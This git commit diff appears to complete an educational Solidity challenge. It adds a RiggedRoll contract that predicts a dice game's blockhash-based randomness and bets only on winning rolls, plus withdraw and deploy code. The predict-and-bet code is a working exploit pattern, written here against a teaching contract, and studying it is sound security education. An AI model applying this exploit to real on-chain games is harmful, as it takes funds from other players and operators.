b9a9e20bfc95a84085465db3e387ea9d56085fae
0xJayPi <jpcampaya@gmail.com>
2022-11-30 11:54:18 +0100

    Challenge 3 completed

--- packages/hardhat/contracts/RiggedRoll.sol
+++ packages/hardhat/contracts/RiggedRoll.sol
@@ -1,24 +1,51 @@
-pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
+pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
 //SPDX-License-Identifier: MIT
 
 import "hardhat/console.sol";
 import "./DiceGame.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
-contract RiggedRoll is Ownable {
+error RiggedRoll__NotEnoughEth();
+error RiggedRoll__TransferFailed();
+error RiggedRoll__LowerThan2();
 
+contract RiggedRoll is Ownable {
     DiceGame public diceGame;
 
     constructor(address payable diceGameAddress) {
         diceGame = DiceGame(diceGameAddress);
     }
 
+    function riggedRoll() public {
+        if (address(this).balance < 0.002 ether) {
+            console.log("\t", "   Rigged Contract Balance insufficient");
+            revert RiggedRoll__NotEnoughEth();
+        }
+
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(
+            abi.encodePacked(prevHash, diceGame, diceGame.nonce())
+        );
+        uint256 roll = uint256(hash) % 16;
+
+        console.log("\t", "   Rigged Dice Roll:", roll);
+
+        if (roll > 2) {
+            revert RiggedRoll__LowerThan2();
+        }
+
+        console.log("\t", "   Rolling the Rigged Dice!!");
+        diceGame.rollTheDice{value: 0.002 ether}();
+    }
+
+    receive() external payable {}
+
+    function withdraw(address _addr, uint256 _amount) public payable onlyOwner {
+        (bool success, ) = payable(_addr).call{value: _amount}("");
+        if (!success) {
+            revert RiggedRoll__TransferFailed();
+        }
+    }
+
     //Add withdraw function to transfer ether from the rigged contract to an address
-
-
-    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
-
-
-    //Add receive() function so contract can receive Eth
-    
 }
--- packages/hardhat/deploy/01_deploy_riggedRoll.js
+++ packages/hardhat/deploy/01_deploy_riggedRoll.js
@@ -9,19 +9,17 @@ module.exports = async ({ getNamedAccounts, deployments, getChainId }) => {
 
   const diceGame = await ethers.getContract("DiceGame", deployer);
 
-  /*
   await deploy("RiggedRoll", {
-   from: deployer,
-   args: [diceGame.address],
-   log: true,
+    from: deployer,
+    args: [diceGame.address],
+    log: true,
   });
-  */
 
-  //const riggedRoll = await ethers.getContract("RiggedRoll", deployer);
+  const riggedRoll = await ethers.getContract("RiggedRoll", deployer);
 
-  //const ownershipTransaction = await riggedRoll.transferOwnership("** YOUR FRONTEND ADDRESS **");
-  
-
+  const ownershipTransaction = await riggedRoll.transferOwnership(
+    "0x7433D81d1c86cb8bF74358ecbe9b0ed16Fd0b17C"
+  );
 };
 
 function sleep(ms) {
